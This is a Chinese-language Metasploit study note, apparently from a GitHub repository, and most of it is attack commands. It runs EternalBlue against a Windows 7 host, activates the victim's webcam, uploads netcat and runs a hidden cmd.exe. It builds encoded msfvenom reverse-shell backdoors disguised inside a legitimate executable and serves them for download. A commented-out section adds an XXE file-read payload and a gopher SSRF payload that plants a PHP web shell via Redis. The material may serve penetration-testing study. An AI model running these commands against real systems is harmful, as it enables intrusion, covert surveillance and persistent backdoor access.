<!---
```diff
+ green color text
- red color text
```
-->

+ 進入metasploit
  - msfdb init : 初始化數據庫 (若沒執行這行，連接數據庫會有問題)
  - msfconsole : 啟動
  - workspace : 當前工作區
  - db_status :　是否成功連接到數據庫
  - workspace -a meow :　另創一個數據庫meow
  - ? : 通過?查看當前工作區可以使用的指令
  
![image](https://user-images.githubusercontent.com/96654161/170452994-0fe2ddb7-384f-4459-ac3f-a124c83b3922.png)

+ 信息蒐集 -> 內網主機發現
  - db_nmap : nmap掃描
    - -PA : TCP ACK PING掃描
    - -PS : TCP SYN PING掃描
    - -PR : ARP掃描nmap對目標進行arp ping掃描的過程，尤其在內網的情況下。因為防火牆不會禁止ARP請求
    - hosts : 列出當前工作區所有主機
    
  - 1.ifconfig 查看當前哪些主機存活
  - 2.db_nmap -PR IP/24
  
![image](https://user-images.githubusercontent.com/96654161/170454550-ace64ee5-bc5b-441c-9a1f-336568b2abd2.png)

     -T[0-5] : 莫認為T3、T4表示最大TCP掃描延遲為10ms
     sS : TCP SYN掃描
     sA : TCP ACK掃描
     sY : TCP SYN掃描
     A : 打開操作系統探測和版本探測
 
  - db_nmap -sS -A -T4 192.168.xx.x
![image](https://user-images.githubusercontent.com/96654161/170462660-3b86cb80-6cd1-4b8b-845f-fccd63797fb7.png)

  - db_nmap --script=vuln IP
    - script=vuln : 檢查是否具有常見漏洞
![image](https://user-images.githubusercontent.com/96654161/170464782-26acc2ae-f016-4e50-a663-93dcd80ac177.png)
>這裡找到ms17_010

+ auxiliary 模塊
  - search ms17_010
 
![image](https://user-images.githubusercontent.com/96654161/170476395-67b42a48-a313-4595-aaac-7a59570dcdbd.png)
>這裡看到第三項，描述的是for win8，但在前面掃描OS是win7所以不適用

  - info auxiliary/scanner/smb/smb_ms17_010

![image](https://user-images.githubusercontent.com/96654161/170468777-31bd8a4c-e86d-4584-a37c-e2f938d267c9.png)

  - use auxiliary/scanner/smb/smb_ms17_010 #要使用某模塊都用 use modules
  - options 查看設置 ->required 如果是yes就必須要配置
![image](https://user-images.githubusercontent.com/96654161/170471161-04096171-0096-4c96-92e6-fc5cc911859c.png)

  - set RHOSTS 掃描主機IP
  - run / exploit 執行
![image](https://user-images.githubusercontent.com/96654161/170472589-93bc1135-7785-47a5-b28e-c4e3d361b9fe.png)

+ use exploit/windows/smb/ms17_010_eternalblue
+ options
+ set rhosts ip
+ show targets
+ run

![image](https://user-images.githubusercontent.com/96654161/170538076-6daa23d6-324e-4a85-af13-0ba5bc71738e.png)
![image](https://user-images.githubusercontent.com/96654161/170542273-10a4a4fb-3675-4f8a-a251-9986197e8170.png)
![image](https://user-images.githubusercontent.com/96654161/170542834-39ae3629-4501-4b9b-8d89-03b2771d5806.png)

>sessions[-l] : 列出當前所有session
>sessions[-i]id:進入某個session
>background : 把當前shell放到後台去執行，然後返回到MSF中

![image](https://user-images.githubusercontent.com/96654161/170543869-79dae501-522f-4151-80f5-8cb957994134.png)

```diff
show exploits -> 查看所有可用的滲透攻擊程序代碼 
show auxiliary -> 查看所有可用的輔助攻擊工具
[show]options/advanced -> 查看該模塊可用選項
show payloads -> 查看該模塊適用的所有載荷代碼
show targets -> 查看該模塊適用的攻擊目標類型
search -> 根據關鍵字搜索某模塊
info -> 顯示某模塊的詳細信息
use -> 使用某滲透攻擊模塊
back -> 回退
set/unset -> 設置/禁用模塊中的某個參數
setg/unsetg -> 設置/禁用適用於所有模塊的全局參數
save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使用
```
### 開啟攝像頭

+ sessions -u id : 將某個session轉為meterpreter
+ 由shell轉meterpreter 

![image](https://user-images.githubusercontent.com/96654161/170551298-5e7490c3-eedf-4547-8adb-2a0e2f713a98.png)

+ sessions -i id
+ ? (查看當前可以使用的命令)
![image](https://user-images.githubusercontent.com/96654161/170551366-390beaf3-9fec-4584-bd8d-3e76906cdc2b.png)
![image](https://user-images.githubusercontent.com/96654161/170551422-770a6fbc-db10-471f-940b-972ef34aadc1.png)
![image](https://user-images.githubusercontent.com/96654161/170551811-67a65e65-2925-4c1d-b39e-57b99f996055.png)
![image](https://user-images.githubusercontent.com/96654161/170551958-4c27c0c4-ab7a-4d03-a48f-c869a391b668.png)

+ webcam_list : 查看攝像頭 列出對方的攝像頭
+ webcam_snap : 通過攝像頭拍照 
+ webcam_stream : 通過攝像頭開啟視頻
![image](https://user-images.githubusercontent.com/96654161/170553668-bd7808e9-d768-4aa3-872c-83e8392e8c40.png)

+ upload : 上傳本地文件到目標機器
+ upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

![image](https://user-images.githubusercontent.com/96654161/170554858-4d4c5e79-b402-43b8-b659-505b5fd1a45c.png)


+ execute -H -i -f cmd.exe
+ execute : 再目標機器執行文件，創建新process cmd.exe,-H不可見,-i交互

![image](https://user-images.githubusercontent.com/96654161/170554951-c24df2ab-ee80-46f1-9967-8fca0d3619d4.png)
>上傳後執行

### msfvenom

+ msfvenom是msfpayload和msfencode的組合，將這兩工具集成在一個框架實例中
+ 用來生成後門的軟件，在目標機上執行後門，在本地監聽上線

```diff
-p : --payload,指定特定的payload 如果被設置為 - 那麼從標準輸入流中讀取,幾乎支援所有系統平台
-l : --list 列出所有可用的項目 其中值可以被設置為 payload,encoders,nops,all
-n : --nopsled 指定nop在payload中的數量
-f : --format 指定payload的輸出格式(.exe、.sh..)(--list formats : 列出所有可用的輸出格式)
-e : --encoder，指定使用的encoder
-a : --arch 指定目標系統架構
--platform : 指定目標系統平台
-s : --space 設置未經編碼的payload最大長度(--encoder-space:編碼後的payload的最大長度)
-b : --bad-chars 設置需要在payload中避免出現的字符 EX:'\0f'、'\x00'
-i : iterations 設置payload的編碼次數
--smallest : 盡可能生成最短payload
-o : --out 保存payload文件
-c : --add-code 指定一個附加的win32 shellcode 文件
-x : --template 指定一個特定的可執行文件作為模板
-k : --keep 保護模板程序的功能 注入payload作為一個新的進程運行
```

+ linux **(LHOST 跟 LPORT 是對當前選擇的payload設置要回連的地址及端口去做設置)**
  + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f elf > shell.elf  (反向連接模塊 目標主機主動來連本地主機)
  + msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Port to connect ON> -f elf > shell.elf (本地主機主動連接目標主機)

+ windows
  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f exe > shell.exe 
  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=xxxx -x /root/Desktop/StampRemover.exe -e x86/shikata_ga_nai -f exe -o /var/www/html/heello.exe

 **x86/shikata_ga_nai:等級為excellent ; 解碼跟編碼過程都是隨機生成的** 
![image](https://user-images.githubusercontent.com/96654161/170610208-3347eff2-359e-48c9-a9e3-04a5f46a2e81.png)
> 看到 cmd/powershell_base64   excellent  Powershell Base64 Command Encoder
> x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback En
>只有這兩個encoder是excellent

>-x /root/Desktop/StampRemover.exe 如果沒指定模板文件，預設執行檔icon會是一般的執行檔樣式，有指定模板文件的話，除了icon會一樣，文件大小也會差不多，較能成功偽裝正常文件。/root/Desktop/StampRemover.exe是模板文件位置
>![image](https://user-images.githubusercontent.com/96654161/170607393-4a3fb9da-cd0e-4b5b-9a98-1816ff65b26e.png)

  
![image](https://user-images.githubusercontent.com/96654161/170606643-4847649d-a271-4b68-b3f1-671803cfb893.png)
  
>通常存到/var/www/html底下，外部機器想要下載的話，需要用service apache2 start
>![image](https://user-images.githubusercontent.com/96654161/170607020-c3911031-6915-41b8-997b-df410fe232c0.png)

  
+ 在被攻擊機器上下載好payload後，在本地msfconsole測試是否可成功回連
  + use exploit/multi/handler 該模塊是一個有效負載處理程序，他只處理在受損主機中執行的有效負載連接
  + options
  + set payload windows/meterpreter/reverse_tcp (這裡設置的payload要跟msfvenom設置的payload一樣)
 ![image](https://user-images.githubusercontent.com/96654161/170608676-f9d6480f-749e-4088-a9d1-18580305043f.png)
  + options 
  + set lhosts ip address(這裡的ip要跟msfvenom設置的一樣)
  + set lport port(這裡的port要跟msfvenom設置的一樣)
  + run
![image](https://user-images.githubusercontent.com/96654161/170609024-8da25c58-3b6b-4f84-9b3a-3fcecc249ac0.png)
  
>運行成功的話，會在被攻擊機上成功執行該payload，可以在工作管理員查看
  ![image](https://user-images.githubusercontent.com/96654161/170609271-ac65f0d2-90f1-4b8d-8fdd-b4045ecc8af6.png)


  
  
  
  
 

+ mac
  + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f macho > shell.macho
  
  

<!---
XXE 
<!DOCTYPE kaibro[
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>&xxe;</root>
     
 SSRF gopher     
 gopher://localhost:6379/_FLUSHALL%0d%0aSET%20kaibro%20"<%3F=system($_GET[1]);%3F>"%0d%0aCONFIG%20SET%20DIR%20/www/%0d%0aCONFIG%20SET%20DBFILENAME%20ggininder123.php%0d%0aSAVE%0d%0aQUIT

-->
